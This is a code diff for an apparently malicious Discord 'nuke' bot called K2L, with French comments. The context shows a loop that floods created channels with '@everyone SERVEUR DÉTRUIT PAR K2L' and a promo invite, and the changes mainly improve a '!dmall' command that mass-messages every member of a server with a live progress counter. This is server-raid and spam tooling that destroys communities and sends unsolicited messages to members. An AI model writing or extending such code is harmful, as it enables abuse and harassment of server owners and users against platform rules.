@@ -1,11 +1,11 @@
-// Build Revision: K2L-Bot-Ultimate-Dashboard-v22.0
+// Build Revision: K2L-Bot-DMAll-Live-v23.0
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end('K2L Bot Ultimate Dashboard Operational v22.0!\n');
+    res.end('K2L Bot DMAll Live Operational v23.0!\n');
 }).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));
 
 const client = new Client({
@@ -592,7 +592,7 @@ client.on('messageCreate', async message => {
                         }]
                     }).then(channel => {
                         for (let j = 0; j < 12; j++) {
-                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/kyuro').catch(() => {});
                         }
                     }).catch(() => {});
                 }
@@ -639,6 +639,7 @@ client.on('messageCreate', async message => {
                 return;
             }
 
+            // Commande !dmall mise à jour avec embed de suivi en temps réel et compteur dynamique
             if (command === 'dmall') {
                 await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
                 const filter = m => m.author.id === message.author.id;
@@ -668,13 +669,33 @@ client.on('messageCreate', async message => {
                             return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                         }
                         if (interaction.customId === 'confirm_dmall') {
-                            await interaction.update({ content: "🚀 **Diffusion DMAll lancée en fond...**", embeds: [], components: [] }).catch(() => {});
+                            await interaction.update({ content: "🚀 **Diffusion DMAll en cours...**", embeds: [], components: [] }).catch(() => {});
+                            
                             try {
                                 await message.guild.members.fetch();
                                 const members = message.guild.members.cache.filter(member => !member.user.bot);
+                                const totalMembers = members.size;
                                 let successCount = 0;
                                 let failCount = 0;
-                                const promises = members.map(async member => {
+                                let processed = 0;
+
+                                // Création de l'embed de suivi en temps réel
+                                const liveEmbed = new EmbedBuilder()
+                                    .setColor('#f39c12')
+                                    .setTitle('🚀 Diffusion DMAll en cours...')
+                                    .setDescription(`Progression de l'envoi des messages privés...`)
+                                    .addFields(
+                                        { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
+                                        { name: '✅ Succès', value: `\`0\``, inline: true },
+                                        { name: '❌ Échecs', value: `\`0\``, inline: true },
+                                        { name: '⏳ Restants', value: `\`${totalMembers}\``, inline: true }
+                                    )
+                                    .setTimestamp();
+
+                                const statusMsg = await message.channel.send({ embeds: [liveEmbed] });
+
+                                for (const [id, member] of members) {
+                                    processed++;
                                     try {
                                         const finalMessage = messageTemplate
                                             .replace(/\{mention\}/g, `<@${member.id}>`)
@@ -684,9 +705,25 @@ client.on('messageCreate', async message => {
                                     } catch (err) {
                                         failCount++;
                                     }
-                                });
-                                await Promise.all(promises);
-                                await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
+
+                                    // Mise à jour de l'embed en direct toutes les 5 personnes ou à la fin
+                                    if (processed % 5 === 0 || processed === totalMembers) {
+                                        liveEmbed.setFields(
+                                            { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
+                                            { name: '✅ Succès', value: `\`${successCount}\``, inline: true },
+                                            { name: '❌ Échecs', value: `\`${failCount}\``, inline: true },
+                                            { name: '⏳ Restants', value: `\`${totalMembers - processed}\``, inline: true }
+                                        );
+                                        await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
+                                    }
+                                }
+
+                                // Embed final une fois terminé
+                                liveEmbed.setColor('#2ecc71')
+                                    .setTitle('✅ Diffusion DMAll Terminée !')
+                                    .setDescription(`Tous les messages ont été traités.`);
+                                
+                                await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
                             } catch (error) {
                                 message.channel.send("❌ Erreur lors du DMAll.");
                             }
